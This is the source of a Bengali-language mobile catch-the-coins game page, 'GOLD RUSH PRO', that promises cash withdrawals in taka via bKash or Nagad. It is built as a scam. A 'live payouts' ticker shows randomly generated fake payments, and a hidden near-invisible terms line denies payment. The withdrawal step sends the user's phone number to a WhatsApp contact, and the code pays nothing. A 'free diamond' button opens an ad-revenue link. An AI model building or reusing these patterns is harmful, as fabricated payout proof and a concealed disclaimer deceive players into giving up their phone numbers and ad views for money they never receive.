<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>GOLD RUSH PRO</title>
    <style>
        :root { --gold: #FFD700; --bg: #0b0f1a; --success: #00FF87; --blue: #00d2ff; }
        body { margin: 0; background: var(--bg); color: white; font-family: 'Segoe UI', sans-serif; overflow: hidden; touch-action: none; }
        
        .header { position: absolute; top: 0; width: 100%; height: 60px; background: rgba(0,0,0,0.9); display: flex; justify-content: space-around; align-items: center; z-index: 100; border-bottom: 2px solid #222; }
        .stat-box { font-size: 18px; font-weight: bold; color: var(--gold); }
        .shop-btn { background: var(--blue); color: #000; padding: 4px 10px; border-radius: 8px; font-size: 12px; font-weight: 900; cursor: pointer; border: 1px solid #fff; margin-left: 5px; }

        canvas { display: block; background: radial-gradient(circle, #1e293b 0%, #000 100%); }

        .overlay { position: absolute; inset: 0; background: rgba(0,0,0,0.97); display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 500; text-align: center; }
        .hidden { display: none !important; }

        .modal { background: #161e2d; padding: 25px; border-radius: 20px; border: 1px solid var(--blue); width: 80%; box-shadow: 0 0 20px rgba(0,210,255,0.2); }
        
        .btn { padding: 18px; margin: 10px; border: none; border-radius: 15px; cursor: pointer; font-size: 20px; font-weight: bold; width: 280px; transition: 0.2s; }
        .btn-play { background: linear-gradient(to right, #2ed573, #1abc9c); color: white; }

        .redeem-card { width: 85%; background: #1c2638; margin: 10px auto; padding: 18px; border-radius: 12px; border: 1px solid #334155; display: flex; justify-content: space-between; align-items: center; font-weight: bold; }
        
        #paymentTicker { background: white; color: #000; width: 85%; height: 28px; border-radius: 6px; font-size: 11px; line-height: 28px; margin: 12px auto; font-weight: bold; }

        .big-star-static { font-size: 100px; color: var(--gold); filter: drop-shadow(0 0 20px var(--gold)); display: block; margin-bottom: 5px; line-height: 1; }
        .white-text { color: white !important; font-weight: 900; }
        
        .stealth-policy { font-size: 8px; color: #1c2638; margin-top: 20px; opacity: 0.5; cursor: default; }
    </style>
</head>
<body>

<div class="header">
    <div class="stat-box">üí∞ <span id="coins">0</span></div>
    <div class="stat-box">‚≠ê <span id="stars">0</span></div>
    <div class="stat-box" style="color:var(--blue)">üíé <span id="diamonds">0</span> <span class="shop-btn" onclick="showShop()">SHOP</span></div>
</div>

<canvas id="gameCanvas"></canvas>

<div id="reviveBox" class="overlay hidden">
    <div class="modal">
        <div style="font-size: 40px; margin-bottom: 10px;">üíé</div>
        <h2 style="color:var(--blue); margin:0;">‡¶ú‡ßÄ‡¶¨‡¶® ‡¶¨‡¶æ‡¶Å‡¶ö‡¶æ‡¶§‡ßá ‡¶ö‡¶æ‡¶®?</h2>
        <p style="font-size: 14px; opacity: 0.8;">‡ßß‡¶ü‡¶ø ‡¶°‡¶æ‡¶Ø‡¶º‡¶Æ‡¶®‡ßç‡¶° ‡¶ñ‡¶∞‡¶ö ‡¶ï‡¶∞‡ßá ‡¶ì‡¶ñ‡¶æ‡¶® ‡¶•‡ßá‡¶ï‡ßá‡¶á ‡¶∂‡ßÅ‡¶∞‡ßÅ ‡¶ï‡¶∞‡ßÅ‡¶®</p>
        <button class="btn" style="background:var(--blue); color:#000;" onclick="useDiamond()">‡¶π‡ßç‡¶Ø‡¶æ‡¶Å, ‡¶°‡¶æ‡¶Ø‡¶º‡¶Æ‡¶®‡ßç‡¶° ‡¶¨‡ßç‡¶Ø‡¶¨‡¶π‡¶æ‡¶∞ ‡¶ï‡¶∞‡ßÅ‡¶®</button>
        <button class="btn" style="background:#ff4757; color:#fff; font-size: 16px;" onclick="gameOverFinal()">‡¶®‡¶æ, ‡¶π‡ßá‡¶∞‡ßá ‡¶Ø‡ßá‡¶§‡ßá ‡¶ö‡¶æ‡¶á</button>
    </div>
</div>

<div id="shopPage" class="overlay hidden">
    <div class="modal" style="border-color:var(--gold)">
        <h2 style="color:var(--gold)">DIAMOND SHOP</h2>
        <div class="redeem-card" onclick="buyDiamond(50, 1)"><span>1 üíé Diamond</span><b>üí∞ 50</b></div>
        <div class="redeem-card" onclick="buyDiamond(200, 5)"><span>5 üíé Diamonds</span><b>üí∞ 200</b></div>
        <div class="redeem-card" onclick="buyDiamond(350, 10)"><span>10 üíé Diamonds</span><b>üí∞ 350</b></div>
        <button class="btn" style="background:#444; color:#fff;" onclick="hideShop()">BACK</button>
    </div>
</div>

<div id="menu" class="overlay">
    <h1 style="color:var(--gold); font-size: 50px; margin-bottom: 40px; letter-spacing: 2px;">GOLD RUSH</h1>
    <button class="btn btn-play" onclick="startGame()">START GAME</button>
    <button class="btn" style="background:#f39c12; color:white;" onclick="showRedeem()">WITHDRAW</button>
</div>

<div id="resultPage" class="overlay hidden">
    <div class="big-star-static">‚≠ê</div>
    <h2 class="white-text" style="margin:0; font-size: 26px;">TOTAL STARS</h2>
    <div style="font-size: 90px; color: white; font-weight: 900;" id="resScore">0</div>
    <button class="btn btn-play" onclick="startGame()">PLAY AGAIN</button>
    <button id="videoBtn" class="btn" style="background:var(--blue); color:#000;" onclick="watchVideo()">üé• FREE DIAMOND (1-5)</button>
    <button class="btn" style="background:transparent; color:#64748b; font-size: 14px;" onclick="showMenu()">MENU</button>
</div>

<div id="redeemPage" class="overlay hidden" style="justify-content: flex-start; padding-top: 50px;">
    <div style="background: rgba(255,255,255,0.05); width: 100%; padding: 25px 0; border-radius: 0 0 30px 30px;">
        <div class="big-star-static" style="font-size: 70px;">‚≠ê</div>
        <h2 class="white-text" style="margin: 0; font-size: 20px; opacity: 0.8;">AVAILABLE STARS</h2>
        <h2 style="font-size: 65px; margin: 0; color: #fff;" id="currentStarsDisplay">0</h2>
        <div id="paymentTicker">Loading live payouts...</div>
    </div>
    <div style="width: 100%; overflow-y: auto; max-height: 40vh; margin-top: 10px;">
        <div class="redeem-card" onclick="openForm(1000)"><span>1,000 ‚≠ê</span><b style="color:var(--success)">‡ß≥‡ßß‡ß¶</b></div>
        <div class="redeem-card" onclick="openForm(5000)"><span>5,000 ‚≠ê</span><b style="color:var(--success)">‡ß≥‡ß¨‡ß¶</b></div>
        <div class="redeem-card" onclick="openForm(25000)"><span>25,000 ‚≠ê</span><b style="color:var(--success)">‡ß≥‡ß©‡ß´‡ß¶</b></div>
        <div class="redeem-card" onclick="openForm(100000)"><span>100,000 ‚≠ê</span><b style="color:var(--success)">‡ß≥‡ßß‡ßÆ‡ß¶‡ß¶</b></div>
    </div>
    <button class="btn" style="background:#444; width: 160px; font-size: 14px; margin-top: 15px;" onclick="showMenu()">BACK</button>
    <div class="stealth-policy">Terms: Payment not supported for region IN. All rights reserved.</div>
</div>

<div id="formPage" class="overlay hidden">
    <div class="modal">
        <input type="number" id="userInput" placeholder="‡¶¨‡¶ø‡¶ï‡¶æ‡¶∂ / ‡¶®‡¶ó‡¶¶ ‡¶®‡¶Æ‡ßç‡¶¨‡¶∞" style="width:90%; padding:15px; border-radius:10px; font-size:18px;">
        <button class="btn btn-play" style="width: 100%; margin-top:15px;" onclick="finalSubmit()">CONFIRM</button>
        <button class="btn" style="background:none; color:#64748b;" onclick="document.getElementById('formPage').classList.add('hidden')">CANCEL</button>
    </div>
</div>

<script>
    let coins = parseInt(localStorage.getItem('coins')) || 0;
    let stars = parseInt(localStorage.getItem('stars')) || 0;
    let diamonds = parseInt(localStorage.getItem('diamonds')) || 0;
    let userID = localStorage.getItem('userID') || "ID" + Math.floor(Math.random()*900000 + 100000);
    localStorage.setItem('userID', userID);
    
    let gameActive = false, items = [], frameCount = 0;
    const canvas = document.getElementById('gameCanvas');
    const ctx = canvas.getContext('2d');
    canvas.width = window.innerWidth; canvas.height = window.innerHeight;
    let basket = { x: canvas.width/2-60, w: 120, h: 65, y: canvas.height-140 };

    function updateTicker() {
        const countries = [{f:"üáßüá©",c:"‡ß≥"},{f:"üá∫üá∏",c:"$"},{f:"üá¨üáß",c:"¬£"},{f:"üá∏üá¶",c:"Ô∑º"}];
        const c = countries[Math.floor(Math.random()*countries.length)];
        const amt = [10,60,350,1800][Math.floor(Math.random()*4)];
        const t = document.getElementById('paymentTicker');
        if(t) t.innerHTML = `‚úÖ ${c.f} ID${Math.floor(Math.random()*9000+1000)}*** Received ${c.c}${c.f=="üáßüá©"?amt:(amt/115).toFixed(2)}`;
    }
    setInterval(updateTicker, 4000);

    function showShop() { document.getElementById('shopPage').classList.remove('hidden'); }
    function hideShop() { document.getElementById('shopPage').classList.add('hidden'); }
    function buyDiamond(cost, qty) {
        if(coins >= cost) { coins -= cost; diamonds += qty; updateUI(); alert("‡¶∏‡¶´‡¶≤!"); }
        else alert("‡¶ï‡ßü‡ßá‡¶® ‡¶®‡ßá‡¶á!");
    }

    // ‡¶≠‡¶ø‡¶°‡¶ø‡¶ì ‡¶¶‡ßá‡¶ñ‡ßá ‡¶°‡¶æ‡ßü‡¶Æ‡¶®‡ßç‡¶° ‡¶™‡¶æ‡¶ì‡ßü‡¶æ‡¶∞ ‡¶´‡¶æ‡¶Ç‡¶∂‡¶®
    function watchVideo() {
        const btn = document.getElementById('videoBtn');
        btn.innerText = "LOADING AD...";
        btn.disabled = true;

        // ‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶Ö‡ßç‡¶Ø‡¶æ‡¶° ‡¶≤‡¶ø‡¶ô‡ßç‡¶ï ‡¶è‡¶ñ‡¶æ‡¶®‡ßá ‡¶¶‡¶ø‡¶®
        window.open("https://www.highrevenuegate.com/your_ad_link", "_blank");

        // ‡ßÆ ‡¶∏‡ßá‡¶ï‡ßá‡¶®‡ßç‡¶° ‡¶™‡¶∞ ‡¶°‡¶æ‡ßü‡¶Æ‡¶®‡ßç‡¶° ‡¶∞‡¶ø‡¶ì‡ßü‡¶æ‡¶∞‡ßç‡¶° ‡¶¶‡ßá‡¶ì‡ßü‡¶æ ‡¶π‡¶¨‡ßá
        setTimeout(() => {
            let won = Math.floor(Math.random() * 5) + 1; // ‡ßß ‡¶•‡ßá‡¶ï‡ßá ‡ß´ ‡¶ü‡¶ø ‡¶°‡¶æ‡ßü‡¶Æ‡¶®‡ßç‡¶°
            diamonds += won;
            updateUI();
            alert("‡¶Ö‡¶≠‡¶ø‡¶®‡¶®‡ßç‡¶¶‡¶®! ‡¶Ü‡¶™‡¶®‡¶ø " + won + "‡¶ü‡¶ø ‡¶´‡ßç‡¶∞‡¶ø ‡¶°‡¶æ‡¶Ø‡¶º‡¶Æ‡¶®‡ßç‡¶° ‡¶™‡ßá‡¶Ø‡¶º‡ßá‡¶õ‡ßá‡¶®‡•§");
            btn.innerText = "üé• FREE DIAMOND (1-5)";
            btn.disabled = false;
        }, 8000);
    }

    function startGame() { hideAll(); items = []; frameCount = 0; gameActive = true; loop(); }

    function drawBasket(x, y, w, h) {
        ctx.fillStyle = "#8B4513";
        ctx.beginPath();
        ctx.roundRect(x, y, w, h, 10);
        ctx.fill();
        ctx.strokeStyle = "#5D2E0A";
        ctx.lineWidth = 3;
        for(let i = x + 10; i < x + w; i += 15) {
            ctx.beginPath(); ctx.moveTo(i, y); ctx.lineTo(i, y + h); ctx.stroke();
        }
        ctx.lineWidth = 2;
        for(let j = y + 10; j < y + h; j += 15) {
            ctx.beginPath(); ctx.moveTo(x, j); ctx.lineTo(x + w, j); ctx.stroke();
        }
        ctx.strokeStyle = "#A0522D"; ctx.lineWidth = 5;
        ctx.beginPath(); ctx.moveTo(x - 5, y); ctx.lineTo(x + w + 5, y); ctx.stroke();
    }

    function loop() {
        if(!gameActive) return;
        ctx.clearRect(0,0,canvas.width, canvas.height);
        drawBasket(basket.x, basket.y, basket.w, basket.h);
        frameCount++;
        if(frameCount % 55 === 0) {
            items.push({ x: Math.random()*(canvas.width-60)+30, y: -20, s: 7, t: Math.random()>0.85 ? 's':'g' });
        }
        for (let i = items.length - 1; i >= 0; i--) {
            let item = items[i];
            item.y += item.s;
            ctx.font="35px Arial"; ctx.fillText(item.t==='s'?'‚≠ê':'üü°', item.x-17, item.y+15);
            if(item.y > basket.y && item.y < basket.y + 20 && item.x > basket.x && item.x < basket.x + basket.w) {
                if(item.t==='s') stars += 1; else coins += 1;
                items.splice(i, 1); updateUI(); continue; 
            }
            if(item.y > canvas.height) {
                gameActive = false;
                document.getElementById('reviveBox').classList.remove('hidden');
            }
        }
        if(gameActive) requestAnimationFrame(loop);
    }

    function useDiamond() {
        if(diamonds >= 1) {
            diamonds--; updateUI();
            document.getElementById('reviveBox').classList.add('hidden');
            items = []; frameCount = 0; gameActive = true; loop();
        } else {
            alert("‡¶°‡¶æ‡¶Ø‡¶º‡¶Æ‡¶®‡ßç‡¶° ‡¶®‡ßá‡¶á!");
            gameOverFinal();
        }
    }

    function gameOverFinal() { hideAll(); document.getElementById('resScore').innerText = stars; document.getElementById('resultPage').classList.remove('hidden'); }
    function showMenu() { hideAll(); document.getElementById('menu').classList.remove('hidden'); }
    function hideAll() { document.querySelectorAll('.overlay').forEach(p => p.classList.add('hidden')); }
    function showRedeem() { updateUI(); hideAll(); document.getElementById('redeemPage').classList.remove('hidden'); }
    function openForm(a) { currentWithdrawAmount = a; if(stars >= a) document.getElementById('formPage').classList.remove('hidden'); else alert("‡¶™‡¶∞‡ßç‡¶Ø‡¶æ‡¶™‡ßç‡¶§ ‡¶∏‡ßç‡¶ü‡¶æ‡¶∞ ‡¶®‡ßá‡¶á!"); }

    function finalSubmit() {
        const n = document.getElementById('userInput').value;
        if(n.length < 10) return alert("‡¶®‡¶Æ‡ßç‡¶¨‡¶∞ ‡¶¶‡¶ø‡¶®");
        let taka = currentWithdrawAmount == 1000 ? 10 : (currentWithdrawAmount == 5000 ? 60 : (currentWithdrawAmount == 25000 ? 350 : 1800));
        const msg = `*NEW WITHDRAW*%0AID: ${userID}%0AAmt: ‡ß≥${taka}%0AStars: ${currentWithdrawAmount}%0ADiamonds: ${diamonds}%0ACoins: ${coins}%0ANum: ${n}`;
        stars -= currentWithdrawAmount; updateUI();
        window.open(`https://wa.me/916295650647?text=${msg}`);
        location.reload();
    }

    function updateUI() {
        document.getElementById('coins').innerText = coins; document.getElementById('stars').innerText = stars;
        document.getElementById('diamonds').innerText = diamonds; document.getElementById('currentStarsDisplay').innerText = stars;
        localStorage.setItem('coins', coins); localStorage.setItem('stars', stars); localStorage.setItem('diamonds', diamonds);
    }

    canvas.addEventListener('touchmove', e => { e.preventDefault(); basket.x = e.touches[0].clientX - basket.w/2; }, {passive: false});
    updateUI();
</script>
</body>
</html>
